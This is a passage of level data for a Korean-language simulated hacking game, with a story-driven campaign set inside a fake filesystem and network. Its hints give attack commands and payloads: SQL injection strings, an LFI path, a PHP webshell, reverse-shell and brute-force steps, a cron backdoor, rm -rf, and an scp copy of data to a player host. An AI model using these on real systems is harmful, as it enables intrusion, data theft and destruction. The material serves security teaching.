/* ============================================================
 * levels.js — 34미션 캠페인 (NEW_MISSIONS v2)
 * Series 1 각성 · 2 침투 · 3 그림자전쟁 · 4 정전
 * 각 레벨: { id, tier, title, [interlude], brief, objective, hints[], setup, check, success, [stance] }
 * stance(g) → 'creed'|'ghost' : 분기 미션이 클리어 시 1회 가산.
 * ============================================================ */
(function () {
  const { FileSystem, dir, file } = window.FS;

  function world(homeChildren, extraRoot) {
    const root = dir('/', 'rwxr-xr-x', 'root', {
      home: dir('home', 'rwxr-xr-x', 'root', { guest: dir('guest', 'rwxr-xr-x', 'guest', homeChildren || {}) }),
      etc: dir('etc', 'rwxr-xr-x', 'root', { hostname: file('hostname', 'nullsec-node', 'rw-r--r--', 'root') }),
      tmp: dir('tmp', 'rwxrwxrwx', 'root', {}),
      var: dir('var', 'rwxr-xr-x', 'root', { log: dir('log', 'rwxr-xr-x', 'root', {}) }),
      opt: dir('opt', 'rwxr-xr-x', 'root', {}),
      usr: dir('usr', 'rwxr-xr-x', 'root', { bin: dir('bin', 'rwxr-xr-x', 'root', {}) })
    });
    if (extraRoot) extraRoot(root);
    return new FileSystem(root);
  }
  function host(name, ip, ports, opts) { return Object.assign({ name, ip, ports }, opts || {}); }
  const f = file;

  const LEVELS = [
    /* ═══════════ SERIES 1 — 각성 (기초) ═══════════ */
    {
      id: 'S1.01', tier: '기초', title: '눈을 떠라',
      interlude: [
        '// 수신: 03:14 · 발신지 불명 · 보안 채널 강제 OPEN',
        '0xMOTHER> 네 터미널의 권한을 잠시 빌렸다. 비명 지르지 마.',
        '0xMOTHER> 그들이 널 보고 있어. 지금부터 30초, 내 말만 들으면 안 잡힌다.',
        '0xMOTHER> 난 0xMOTHER. 네가 살아남게 막아줄 사람이지.'
      ].join('\n'),
      brief: [
        '0xMOTHER> 환영할 시간은 없다. 디렉터리에 남긴 readme.txt 부터 읽어.',
        '0xMOTHER> `ls` 로 둘러보고 `cat` 으로 펼쳐라. 떨어도 좋으니 멈추지만 마.'
      ].join('\n'),
      objective: 'readme.txt 안의 ACCESS CODE 를 찾아 `submit <코드>` 하라.',
      hints: ['`ls` 로 파일을 본다.', '`cat readme.txt`', 'ACCESS CODE: 뒤의 값을 submit (예: submit NS-7F4)'],
      setup(g) {
        g.fs = world({ 'readme.txt': f('readme.txt', 'NULLSEC 신입에게.\n터미널은 거짓말하지 않는다.\nACCESS CODE: NS-7F4\n', 'rw-r--r--', 'guest') });
        g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'borrowed-term';
      },
      check(g) { return g.submitted && g.submitted.has('NS-7F4'); },
      success: '0xMOTHER> 정확하다. 넌 읽을 줄 안다 — 대부분은 그것조차 못하지.'
    },
    {
      id: 'S1.02', tier: '기초', title: '숨겨진 흔적',
      brief: [
        '0xMOTHER> HELIOS는 모든 걸 기록해. 겉으로 보이는 게 다가 아니야.',
        '0xMOTHER> 점(.)으로 시작하는 파일은 숨는다. `ls -a` 로 장막을 걷어내.'
      ].join('\n'),
      objective: '숨겨진 설정파일 .env 의 DB 비밀번호(DB_PASS=값)를 찾아 submit 하라.',
      hints: ['`ls -a` 로 숨김 파일까지 본다.', '`cat .env`', 'DB_PASS= 뒤의 값을 submit'],
      setup(g) {
        g.fs = world({
          'decoy.txt': f('decoy.txt', '여긴 아무것도 없다.', 'rw-r--r--', 'guest'),
          '.env': f('.env', 'API_URL=https://helios.corp\nDB_PASS=h3lios_dev_99\nDEBUG=true\n', 'rw-r--r--', 'guest')
        });
        g.cwd = '/home/guest'; g.user = 'guest';
      },
      check(g) { return g.submitted && g.submitted.has('h3lios_dev_99'); },
      success: '0xMOTHER> 어둠 속에도 글자는 있다. 가려진 걸 의심하는 첫 본능이군.'
    },
    {
      id: 'S1.03', tier: '기초', title: '바늘 찾기',
      brief: [
        '0xMOTHER> 수십만 줄의 더미 로그다. 손으로는 평생 걸려.',
        '0xMOTHER> `grep` 은 해커의 자석. HELIOS 가 박힌 줄만 끌어내라.'
      ].join('\n'),
      objective: 'system.log 에서 "HELIOS" 가 든 줄을 찾아, 거기 적힌 내부 DB 호스트 IP를 submit 하라.',
      hints: ['`grep HELIOS system.log`', 'HELIOS_DB_HOST= 뒤의 IP', 'submit 10.0.1.9 형태'],
      setup(g) {
        const noise = [];
        for (let i = 0; i < 60; i++) noise.push('[t' + i + '] INFO service heartbeat ok ' + (i * 7 % 100));
        noise.splice(37, 0, '[CONFIG] HELIOS_DB_HOST=10.0.1.9 (internal)');
        g.fs = world({ 'system.log': f('system.log', noise.join('\n'), 'rw-r--r--', 'guest') });
        g.cwd = '/home/guest'; g.user = 'guest';
      },
      check(g) { return g.submitted && g.submitted.has('10.0.1.9'); },
      success: '0xMOTHER> 패턴이 곧 진실이다. 노가다는 약자의 변명이지.'
    },
    {
      id: 'S1.04', tier: '기초', title: '권한의 무게',
      brief: [
        '0xMOTHER> 어떤 바보가 정찰 스크립트의 실행권한을 막아뒀군.',
        '0xMOTHER> 네가 주인이 될 차례다. `chmod +x` 로 자물쇠를 풀고 `./start.sh` 로 실행해.'
      ].join('\n'),
      objective: 'start.sh 에 실행권한을 부여하고 실행(`./start.sh`)하라.',
      hints: ['`ls -l` 로 권한 확인(rw-만 있음)', '`chmod +x start.sh`', '`./start.sh` 로 실행'],
      setup(g) {
        g.fs = world({ 'start.sh': f('start.sh', '#!/bin/sh\necho "[RECON] 다음 표적 대역: 10.0.1.0/24"', 'rw-r--r--', 'guest') });
        g.cwd = '/home/guest'; g.user = 'guest';
      },
      check(g) { return g.ranScripts && g.ranScripts.has('start.sh'); },
      success: '0xMOTHER> 자물쇠는 권한일 뿐. 주인은 언제나 연다.'
    },
    {
      id: 'S1.05', tier: '기초', title: '변환된 암호',
      brief: [
        '0xMOTHER> 암호화가 아니야 — 그냥 알아보기 힘들게 입힌 옷이지.',
        '0xMOTHER> base64 는 가장 흔한 위장. `base64 -d` 로 커튼을 걷어라.'
      ].join('\n'),
      objective: 'cipher.txt 의 base64 를 디코딩해 나온 관리자 계정명을 submit 하라.',
      hints: ['`cat cipher.txt` 로 이상한 문자열 확인', '`base64 -d cipher.txt`', '나온 값을 submit'],
      setup(g) {
        g.fs = world({ 'cipher.txt': f('cipher.txt', btoa('HeliosAdmin') + '\n', 'rw-r--r--', 'guest') });
        g.cwd = '/home/guest'; g.user = 'guest';
      },
      check(g) { return g.submitted && g.submitted.has('HeliosAdmin'); },
      success: '0xMOTHER> 인코딩은 암호가 아니다. 커튼일 뿐이지.'
    },
    {
      id: 'S1.06', tier: '기초', title: '그림자 도메인',
      brief: [
        '0xMOTHER> 거인은 발톱의 때를 신경 안 써. 네임서버를 찔러라.',
        '0xMOTHER> `dig axfr` 로 존 트랜스퍼를 떠서, 외부로 새어나온 테스트 서브도메인을 캐내.'
      ].join('\n'),
      objective: 'dig 로 helios.corp 의 존을 떠서 노출된 테스트 서브도메인을 찾아 submit 하라.',
      hints: ['`dig axfr helios.corp @ns.helios.corp`', '응답에서 dev-* 서브도메인을 찾는다', 'submit dev-test.helios.corp'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest';
        g.dns = {
          records: ['helios.corp.        3600 IN A   203.0.113.10'],
          axfr: [
            'helios.corp.        3600 IN A   203.0.113.10',
            'www.helios.corp.    3600 IN A   203.0.113.11',
            'dev-test.helios.corp. 3600 IN A 10.0.1.5  ; (내부 노출!)',
            'mail.helios.corp.   3600 IN MX  10 mx.helios.corp.'
          ]
        };
      },
      check(g) { return g.submitted && g.submitted.has('dev-test.helios.corp'); },
      success: '0xMOTHER> 잘못 열린 존 트랜스퍼 하나가 그들의 뒷문을 다 보여줬군.'
    },
    {
      id: 'S1.07', tier: '기초', title: '네트워크 스캔',
      brief: [
        '0xMOTHER> 서브도메인을 찾았다(dev-test.helios.corp). 문이 열렸는지 두드려 봐.',
        '0xMOTHER> `nmap` 으로 스캔해라. 발견한 노드가 우측 패널에 그려진다.'
      ].join('\n'),
      objective: 'nmap 으로 dev-test.helios.corp 를 스캔해, 웹(HTTP) 포트 번호를 submit 하라.',
      hints: ['`nmap dev-test.helios.corp`', '열린 포트 중 http 를 찾는다', 'submit 80'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest'; g.ip = '10.0.0.42';
        g.network = [host('dev-test.helios.corp', '10.0.1.5', [
          { port: 21, service: 'ftp' }, { port: 22, service: 'ssh' }, { port: 80, service: 'http' }
        ])];
      },
      check(g) { return g.submitted && g.submitted.has('80'); },
      success: '0xMOTHER> 21·22·80 — 문이 셋이나 열렸군. 골라잡으면 된다.'
    },
    {
      id: 'S1.08', tier: '기초', title: '이메일 스크래핑',
      brief: [
        '0xMOTHER> 팀 소개 페이지를 받아놨다(team.html). 거기서 직원 이메일만 추려라.',
        '0xMOTHER> `grep -oE` 로 패턴만 뽑아 emails.txt 로 저장(`>`)해. 우리의 첫 무기다.'
      ].join('\n'),
      objective: 'team.html 에서 @helios.corp 이메일만 추출해 emails.txt 로 저장하라. (grep -oE + 리다이렉션)',
      hints: ['`grep -oE "[a-z.0-9_]+@helios.corp" team.html`', '결과를 `> emails.txt` 로 저장', 'emails.txt 가 만들어지면 완료'],
      setup(g) {
        g.fs = world({
          'team.html': f('team.html', '<ul>\n<li>김지훈 <a>j.kim@helios.corp</a></li>\n<li>박서연 s.park@helios.corp</li>\n<li>admin <b>admin@helios.corp</b></li>\n</ul>', 'rw-r--r--', 'guest')
        });
        g.cwd = '/home/guest'; g.user = 'guest';
      },
      check(g) { const n = g.fs.getNode('/home/guest/emails.txt'); return !!(n && n.type === 'file' && /@helios\.corp/.test(n.content)); },
      success: '0xMOTHER> 명단을 손에 넣었다. 사람이 가장 약한 고리지.'
    },
    {
      id: 'S1.09', tier: '기초', title: '버전 식별',
      brief: [
        '0xMOTHER> 무작정 들이받지 마. 버전을 알아내. 낡은 방패는 쉽게 깨진다.',
        '0xMOTHER> `nmap -sV` 로 서비스 버전을 캐내라 — 취약점은 버전에 붙으니까.'
      ].join('\n'),
      objective: 'nmap -sV 로 dev-test.helios.corp 의 FTP 서비스 버전 문자열을 알아내 submit 하라.',
      hints: ['`nmap -sV dev-test.helios.corp`', '21/tcp 의 version 필드를 본다', 'submit vsftpd 2.3.4'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest';
        g.network = [host('dev-test.helios.corp', '10.0.1.5', [
          { port: 21, service: 'ftp', version: 'vsftpd 2.3.4' }, { port: 22, service: 'ssh', version: 'OpenSSH 7.4' }
        ])];
      },
      check(g) { return g.submitted && g.submitted.has('vsftpd 2.3.4'); },
      success: '0xMOTHER> vsftpd 2.3.4 — 백도어로 악명 높은 골동품이군. CVE 백화점이다.'
    },
    {
      id: 'S1.10', tier: '기초', title: '첫 번째 침투',
      brief: [
        '0xMOTHER> 직원들은 초기 비번을 잘 안 바꿔. 낡은 FTP 문을 부숴.',
        '0xMOTHER> `hydra` 로 사전 대입한 뒤, 찾은 계정으로 `ftp` 접속해라. 넌 이제 구경꾼이 아니다.'
      ].join('\n'),
      objective: 'hydra 로 dev-test(10.0.1.5) 의 ftp 비번을 wordlist.txt 로 알아낸 뒤 ftp 접속하라.',
      hints: ['`cat wordlist.txt`', '`hydra 10.0.1.5 ftp wordlist.txt`', '찾으면 `ftp 10.0.1.5`'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'guest'; g.ip = '10.0.0.42';
        g.fs = world({ 'wordlist.txt': f('wordlist.txt', '123456\npassword\npassword123\nletmein\nadmin\n', 'rw-r--r--', 'guest') });
        g.network = [host('dev-test', '10.0.1.5', [{ port: 21, service: 'ftp' }], {
          creds: { jkim: 'password123' },
          fs: { 'loot.txt': f('loot.txt', '내부 헬프데스크 망: help.helios.corp', 'rw-r--r--', 'jkim') }
        })];
        g.sshOk = false; g.onSshSuccess = (t) => { if (t.ip === '10.0.1.5') g.sshOk = true; };
      },
      check(g) { return g.sshOk; },
      success: '0xMOTHER> 들어갔다. 첫 침투의 맛은 평생 안 잊혀. …그리고 넌 기록에 남았다.'
    },

    /* ═══════════ SERIES 2 — 침투 (중급) ═══════════ */
    {
      id: 'S2.01', tier: '중급', title: '로봇의 규칙',
      interlude: [
        '0xMOTHER> 골방은 끝났다. 탈취 문서에서 내부 헬프데스크 망이 드러났어.',
        '0xMOTHER> 대문은 잠겼지만 — 모든 자물쇠엔 틈이 있다.'
      ].join('\n'),
      brief: [
        '0xMOTHER> 검색 로봇에게만 알려주는 "들어오지 마" 팻말이 있어.',
        '0xMOTHER> `curl` 로 robots.txt 를 읽어 숨겨진 관리자 경로를 찾아라.'
      ].join('\n'),
      objective: 'help.helios.corp/robots.txt 를 읽어 Disallow 로 숨겨진 관리자 경로를 submit 하라.',
      hints: ['`curl http://help.helios.corp/robots.txt`', 'Disallow: 뒤의 경로', 'submit /admin_portal'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest';
        g.web = { 'http://help.helios.corp/robots.txt': 'User-agent: *\nDisallow: /admin_portal\nDisallow: /backup\nDisallow: /internal' };
      },
      check(g) { return g.submitted && g.submitted.has('/admin_portal'); },
      success: '0xMOTHER> 숨길 거면 인증으로 막아야지. robots.txt 에 적는 건 초대장이다.'
    },
    {
      id: 'S2.02', tier: '중급', title: '거짓말쟁이',
      brief: [
        '0xMOTHER> 숨겨진 로그인 페이지를 찾았군(/admin_portal). DB는 멍청해.',
        "0xMOTHER> 네가 하는 말이 참(True)이라 믿게 만들어. `login admin \"' OR '1'='1' --\"`"
      ].join('\n'),
      objective: "SQL 인젝션으로 인증을 우회 로그인하라. (login admin \"' OR '1'='1' --\")",
      hints: ['입력이 쿼리에 그대로 들어간다', "항상 참인 조건을 주입: ' OR '1'='1'", "주석(--)으로 뒷부분 무력화"],
      setup(g) { g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest'; },
      check(g) { return g.sqliAuth === true; },
      success: '0xMOTHER> 인증을 논리로 뚫었다. Prepared Statement 를 안 쓴 그들의 잘못이지.'
    },
    {
      id: 'S2.03', tier: '중급', title: '깊은 곳의 장부',
      brief: [
        '0xMOTHER> 권한이 낮군. 인젝션을 더 길게 이어, 사용자 테이블을 화면에 토하게 해.',
        "0xMOTHER> `login admin \"' UNION SELECT ... FROM users --\"` — 다른 테이블을 붙이는 거다."
      ].join('\n'),
      objective: 'UNION 기반 인젝션으로 users 테이블의 자격증명을 덤프하라.',
      hints: ['컬럼 수를 맞춰 UNION SELECT', "login admin \"' UNION SELECT null,user,pass FROM users --\"", 'users 가 화면에 나오면 완료'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest';
        g.dumps = { users: 'id | user  | password\n 1 | admin | $1$aa$adminhash99\n 2 | jkim  | $1$bb$kimhash01' };
      },
      check(g) { return g.sqlDumped === true; },
      success: '0xMOTHER> 관리자 해시까지 새어나왔다. 데이터는 이제 우리 것이야.'
    },
    {
      id: 'S2.04', tier: '중급', title: 'LFI — 로컬 파일',
      brief: [
        '0xMOTHER> 첨부파일 다운로드 로직이 허술해. 경로를 거슬러 올라가.',
        '0xMOTHER> 유닉스의 심장 — `?file=../../../../etc/passwd` 로 패스워드 파일을 읽어.'
      ].join('\n'),
      objective: '경로 조작(LFI)으로 /etc/passwd 를 읽어내라. (curl ...?file=../../../../etc/passwd)',
      hints: ['?file= 파라미터를 조작', '`curl "http://help.helios.corp/download?file=../../../../etc/passwd"`', '시스템 사용자 목록이 나오면 완료'],
      setup(g) {
        g.fs = world({}, (root) => { root.children.etc.children.passwd = f('passwd', 'root:x:0:0:root:/root:/bin/bash\nhelios:x:1000:1000::/home/helios:/bin/bash\n', 'rw-r--r--', 'root'); });
        g.cwd = '/home/guest'; g.user = 'guest';
      },
      check(g) { return g.lfiRead === '/etc/passwd'; },
      success: '0xMOTHER> 서버의 심장을 읽었다. 경로 정규화 하나를 빼먹은 대가지.'
    },
    {
      id: 'S2.05', tier: '중급', title: '사냥개의 눈',
      interlude: [
        'ORACLE> 비정상 HTTP 패턴 감지. 방어 AI 가동. 역추적 10%…',
        '0xMOTHER> 젠장, ORACLE이 깼어. 이제부터 속도가 생명이다.'
      ].join('\n'),
      brief: [
        '0xMOTHER> 추적당하기 전에 패킷 덤프에서, 방금 관리자가 흘린 세션 쿠키를 가로채.',
        '0xMOTHER> `tcpdump -r capture.pcap Cookie` 로 쿠키 줄만 추려라.'
      ].join('\n'),
      objective: 'capture.pcap 에서 관리자 세션 쿠키 값(SESSION=...)을 가로채 submit 하라.',
      hints: ['`tcpdump -r capture.pcap Cookie`', 'Cookie: SESSION= 뒤의 값', 'submit S3SS_9f3a2b'],
      setup(g) {
        const pkts = [];
        for (let i = 0; i < 30; i++) pkts.push(`12:00:0${i} IP 10.0.2.${i}.443 > 10.0.0.42: tcp ack`);
        pkts.splice(18, 0, '12:00:18 IP admin > help.helios.corp: GET /admin_portal  Cookie: SESSION=S3SS_9f3a2b; role=admin');
        g.fs = world({ 'capture.pcap': f('capture.pcap', pkts.join('\n'), 'rw-r--r--', 'guest') });
        g.cwd = '/home/guest'; g.user = 'guest';
      },
      check(g) { return g.submitted && g.submitted.has('S3SS_9f3a2b'); },
      success: '0xMOTHER> 세션 탈취 성공. HttpOnly 만 걸었어도 못 가져갔을 텐데.'
    },
    {
      id: 'S2.06', tier: '중급', title: '백도어 업로드',
      brief: [
        '0xMOTHER> 시간 없어! 가로챈 세션으로 관리자 권한을 쥐었다.',
        '0xMOTHER> 이미지 업로드 창에 .php 로 위장한 웹쉘을 던져 넣어 — `curl -X POST -F`'
      ].join('\n'),
      objective: '파일 업로드 검증을 우회해 웹쉘(shell.php)을 /upload 에 올려라.',
      hints: ['shell.php 를 업로드한다', '`curl -X POST -F file=@shell.php http://help.helios.corp/upload`', '200 OK 가 뜨면 완료'],
      setup(g) {
        g.fs = world({ 'shell.php': f('shell.php', '<?php system($_GET["c"]); ?>', 'rw-r--r--', 'guest') });
        g.cwd = '/home/guest'; g.user = 'guest';
        g.uploadEndpoint = '/upload';
      },
      check(g) { return g.uploaded === true; },
      success: '0xMOTHER> 웹쉘 안착. 확장자 검증 한 줄을 빼먹은 그들의 마지막 실수다.'
    },
    {
      id: 'S2.07', tier: '중급', title: '내부망 진입',
      brief: [
        '0xMOTHER> 백도어를 깨워 리버스 쉘을 붙여. 리스너를 먼저 열어야 받지.',
        '0xMOTHER> `nc -lvnp 4444` 로 대기 → 웹쉘 URL을 호출해 콜백을 유도해.'
      ].join('\n'),
      objective: 'nc 리스너를 열고 웹쉘을 트리거해 리버스 쉘로 내부망 거점을 확보하라.',
      hints: ['`nc -lvnp 4444` 로 대기', '`curl http://help.helios.corp/uploads/shell.php`', '리버스 셸이 붙으면 완료'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest'; g.ip = '10.0.0.42';
        g.webshellUrl = 'shell.php';
        g.reverseTarget = host('helios-internal', '10.0.2.5', [{ port: 22, service: 'ssh' }], {
          shellUser: 'www-data',
          fs: { 'note.txt': f('note.txt', '내부망 진입 성공. 다음은 권한 상승.', 'rw-r--r--', 'www-data') }
        });
        g.sshOk = false; g.onSshSuccess = () => { g.sshOk = true; };
      },
      check(g) { return g.sshOk; },
      success: '0xMOTHER> 리버스 셸 성립. HELIOS 내부망에 첫 발을 들였다.'
    },
    {
      id: 'S2.08', tier: '중급', title: '낯선 목소리',
      brief: [
        '0xMOTHER> 내부 셸은 잡았다. guest 권한이지만 — 거점은 거점이야.',
        '0xMOTHER> 잠깐, 누가… 채널에 끼어든다.'
      ].join('\n'),
      incoming: {
        from: 'wraith',
        head: '[ 미식별 채널이 강제로 열렸다 — 역추적 실패 ]',
        lines: [
          '(지직…) 꽤 하잖아? 근데 그렇게 느리고 고지식하게 굴면 결국 사냥개에게 물어뜯겨.',
          '안녕, 신입. /tmp 에 선물 하나 뒀어. 실행은 하지 말고, 읽기만 해봐.'
        ],
        foot: '[ 채널 종료 · 연락처에 WRAITH 추가됨 — `channel wraith` ]'
      },
      objective: 'WRAITH가 남긴 /tmp/gift.sh 의 내용을 확인(cat)하라. (실행은 신뢰가 아니다)',
      hints: ['`ls -l /tmp/gift.sh` 로 정체 확인', '`cat /tmp/gift.sh` 로 내용을 먼저 본다', '실행은 하지 마라 — 공짜엔 갈고리가 있다'],
      setup(g) {
        g.fs = world({}, (root) => { root.children.tmp.children['gift.sh'] = f('gift.sh', '#!/bin/sh\n# WRAITH: 권한상승 자동화 — 단, 백도어도 함께 심는다\nfind / -perm -4000 2>/dev/null', 'rwxr-xr-x', 'wraith'); });
        g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'helios-internal';
      },
      check(g) { return g.readFiles && g.readFiles.has('/tmp/gift.sh'); },
      success: '0xMOTHER> 읽기만 했지? 잘했어. 그자를 믿지 마 — 그렇다고 무시도 하지 마.'
    },

    /* ═══════════ SERIES 3 — 그림자 전쟁 (고급) ═══════════ */
    {
      id: 'S3.01', tier: '고급', title: '권한의 벽',
      interlude: [
        'ORACLE> 침입자 행동 패턴 학습 중. 역추적 34%.',
        '0xMOTHER> WRAITH 말은 흘려. guest 로는 한계야 — 합법적인 사다리를 찾자.'
      ].join('\n'),
      brief: [
        '0xMOTHER> 관리자 권한으로 도는 *잘못 설정된* 파일을 찾아라.',
        '0xMOTHER> `find / -perm -4000 2>/dev/null` 으로 SUID 비트가 선 바이너리를 사냥해.'
      ].join('\n'),
      objective: 'SUID 비트가 선 비표준 바이너리를 찾아 그 경로를 submit 하라.',
      hints: ['`find / -perm -4000 2>/dev/null`', '비표준 이름(예: /usr/bin/runner)을 주목', 'submit /usr/bin/runner'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'helios-internal';
        g.suidFiles = ['/usr/bin/passwd', '/bin/su', '/usr/bin/runner'];
      },
      check(g) { return g.submitted && g.submitted.has('/usr/bin/runner'); },
      success: '0xMOTHER> /usr/bin/runner — 비표준 SUID. 저게 네 사다리다.'
    },
    {
      id: 'S3.02', tier: '고급', title: '두 갈래 길',
      brief: [
        'WRAITH> 그 구식 방법으로 언제 루트 달아? 매분 도는 헬스체크에 한 줄만 덮어쓰면 끝이야.',
        "WRAITH> `echo \"/bin/bash -p\" >> /opt/health.sh`",
        '0xMOTHER> 지름길은 흔적을 남겨. runner 안의 비밀(`strings`)을 읽고 정공법으로 `su root` 해.'
      ].join('\n'),
      objective: 'root 권한을 획득하라 — WRAITH의 크론 백도어 또는 0xMOTHER의 정공법(strings→su).',
      hints: [
        '(WRAITH) `echo "/bin/bash -p" >> /opt/health.sh`',
        '(0xMOTHER) `strings /usr/bin/runner` 로 root 비번을 찾아 `su root <비번>`',
        '둘 중 하나면 클리어 — 선택이 성향(STANCE)을 가른다'
      ],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'helios-internal';
        g.passwords = { root: 'Pr0per_R00t!' };
        g.fs = world({}, (root) => {
          root.children.opt.children['health.sh'] = f('health.sh', '#!/bin/sh\n# runs every minute as root\nuptime\n', 'rwxrwxrwx', 'root');
          root.children.usr.children.bin.children['runner'] = f('runner', '\x7fELF...binary...\nROOT_PW=Pr0per_R00t!\n..more bytes..', 'rwsr-xr-x', 'root');
        });
      },
      check(g) {
        const h = g.fs.getNode('/opt/health.sh');
        return g.user === 'root' || !!(h && /\/bin\/bash -p/.test(h.content));
      },
      stance(g) { return g.user === 'root' ? 'creed' : 'ghost'; },
      success: '0xMOTHER> 결국 루트를 따냈군. 어떻게 땄는지 — 그게 네가 어떤 해커인지 말해준다.'
    },
    {
      id: 'S3.03', tier: '고급', title: '루트 탈취',
      brief: [
        '0xMOTHER> 이제 진짜 목표를 찾자. HELIOS 코어 인증 데몬이 어딘가 있다.',
        '0xMOTHER> `find / -name helios_auth_daemon` 으로 위치를 짚어라.'
      ].join('\n'),
      objective: 'root 권한으로 코어 인증 데몬(helios_auth_daemon)의 전체 경로를 찾아 submit 하라.',
      hints: ['`find / -name helios_auth_daemon`', '결과 경로를 그대로 submit', 'submit /opt/core/helios_auth_daemon'],
      setup(g) {
        g.cwd = '/root'; g.user = 'root'; g.host = 'helios-internal';
        g.fs = world({}, (root) => {
          root.children.root = dir('root', 'rwx------', 'root', {});
          root.children.opt.children.core = dir('core', 'rwxr-xr-x', 'root', {
            'helios_auth_daemon': f('helios_auth_daemon', 'binary', 'rwxr-xr-x', 'root')
          });
        });
      },
      check(g) { return g.submitted && g.submitted.has('/opt/core/helios_auth_daemon'); },
      success: '0xMOTHER> 코어 인증 데몬. 이 안에 들어가면 — 왕국의 열쇠다.'
    },
    {
      id: 'S3.04', tier: '고급', title: '하드코딩',
      brief: [
        '0xMOTHER> 암호화 프로토콜이 복잡해. 다행히 개발자가 마스터 키를 텍스트로 남겼을지도.',
        '0xMOTHER> `strings` 로 바이너리를 뜯어 KEY 를 캐내라.'
      ].join('\n'),
      objective: 'helios_auth_daemon 에서 하드코딩된 마스터 키(MASTER_KEY=값)를 추출해 submit 하라.',
      hints: ['`strings /opt/core/helios_auth_daemon`', 'MASTER_KEY= 뒤의 값', 'submit H3lios_M4st3rK3y'],
      setup(g) {
        g.cwd = '/opt/core'; g.user = 'root'; g.host = 'helios-internal';
        g.fs = world({}, (root) => {
          root.children.opt.children.core = dir('core', 'rwxr-xr-x', 'root', {
            'helios_auth_daemon': f('helios_auth_daemon', '\x00\x01ELF\x02bytes\x00libc.so\x00MASTER_KEY=H3lios_M4st3rK3y\x00malloc\x00', 'rwxr-xr-x', 'root')
          });
        });
      },
      check(g) { return g.submitted && g.submitted.has('H3lios_M4st3rK3y'); },
      success: '0xMOTHER> 마스터 키를 바이너리에 박아둔 게으름 — 우리에겐 선물이지.'
    },
    {
      id: 'S3.05', tier: '고급', title: '비밀의 압축 파일',
      brief: [
        '0xMOTHER> 마스터 키로 연 폴더 안에 거대한 압축 파일. 비번은 회사 규정을 따를 거다.',
        '0xMOTHER> `zip2john` 으로 해시를 뽑아(`>`) `john` 으로 사전 크랙해.'
      ].join('\n'),
      objective: 'data.zip 의 압축 비밀번호를 zip2john→john 으로 크랙해 submit 하라.',
      hints: ['`zip2john data.zip > hash.txt`', '`john --wordlist=rockyou.txt hash.txt`', '나온 비번을 submit'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'root'; g.host = 'helios-internal';
        const zh = '$zip2$*0*helios*deadbeef';
        g.fs = world({ 'data.zip': Object.assign(f('data.zip', 'PK\x03\x04 encrypted', 'rw-r--r--', 'root'), { ziphash: zh }) });
        g.crackable = {}; g.crackable[zh] = 'Helios#2024';
      },
      check(g) { return (g.cracked && g.cracked.has('Helios#2024')) || (g.submitted && g.submitted.has('Helios#2024')); },
      success: '0xMOTHER> 사전 단어 + 연도. 규정대로라 더 잘 깨졌군.'
    },
    {
      id: 'S3.06', tier: '고급', title: '마트료시카',
      brief: [
        'WRAITH> 편집증 관리자가 파일을 4번이나 다르게 압축해뒀네.',
        'WRAITH> 폭탄 해체하듯 한 겹씩 벗겨. `file` 로 형식 보고 맞는 도구로.'
      ].join('\n'),
      objective: '중첩 압축된 payload 를 끝까지 해제하라. (bunzip2 → tar → gunzip)',
      hints: ['`file payload.bz2` 로 형식 확인', '`bunzip2 payload.bz2` → `tar -xvf payload.tar` → `gunzip payload.gz`', '세 겹을 다 벗기면 완료'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'root'; g.host = 'helios-internal';
        const inner = f('secret.txt', 'BLACKLIST 좌표가 여기 있다.', 'rw-r--r--', 'root');
        const gz = Object.assign(f('payload.gz', 'gz', 'rw-r--r--', 'root'), { archive: 'gz', next: inner });
        const tar = Object.assign(f('payload.tar', 'tar', 'rw-r--r--', 'root'), { archive: 'tar', next: gz });
        const bz2 = Object.assign(f('payload.bz2', 'bz2', 'rw-r--r--', 'root'), { archive: 'bz2', next: tar });
        g.fs = world({ 'payload.bz2': bz2 });
      },
      check(g) { return (g.unwrapped || 0) >= 3; },
      success: '0xMOTHER> 세 겹을 다 벗겼다. 편집증도 인내심 앞에선 소용없지.'
    },
    {
      id: 'S3.07', tier: '고급', title: '보이지 않는 잉크',
      brief: [
        '0xMOTHER> 파일명은 JPG인데 내용이 텍스트야. 이미지 *안에* 숨긴 게 있다.',
        '0xMOTHER> `steghide extract -sf` 로 스테가노그래피를 해독해.'
      ].join('\n'),
      objective: 'cover.jpg 에 숨겨진 데이터를 추출해, 안의 블랙리스트 키를 submit 하라.',
      hints: ['`steghide extract -sf cover.jpg`', '나온 hidden.txt 를 `cat`', 'KEY= 뒤의 값을 submit'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'root'; g.host = 'helios-internal';
        g.fs = world({ 'cover.jpg': Object.assign(f('cover.jpg', '\xff\xd8\xff JPEG bytes', 'rw-r--r--', 'root'), { stego: 'BLACKLIST_DB_KEY=z3r0_d4y' }) });
      },
      check(g) { return g.stegoExtracted && g.submitted && g.submitted.has('z3r0_d4y'); },
      success: '0xMOTHER> 이미지 속 잉크까지 읽었군. 이제 마지막 상자를 열 차례다.'
    },
    {
      id: 'S3.08', tier: '고급', title: '판도라의 상자',
      interlude: [
        'WRAITH> 열었군. 이 명단을 봐.',
        'WRAITH> 0xMOTHER 의 본명과 물리적 위치가 적혀 있어. 그녀는 이미 HELIOS 감시 아래야.',
        'WRAITH> 널 장기말로 쓰고 버릴 셈이지. 명단을 *부숴버려.*',
        '0xMOTHER> …그래, 사실이야. 하지만 부수면 증거도 사라져. 복사해서 가져와. 날 믿어줘 — 마지막으로.'
      ].join('\n'),
      brief: [
        'WRAITH> 파괴해: `rm -rf blacklist.db`',
        '0xMOTHER> 보존해: `scp blacklist.db me@10.0.0.42:/tmp/`',
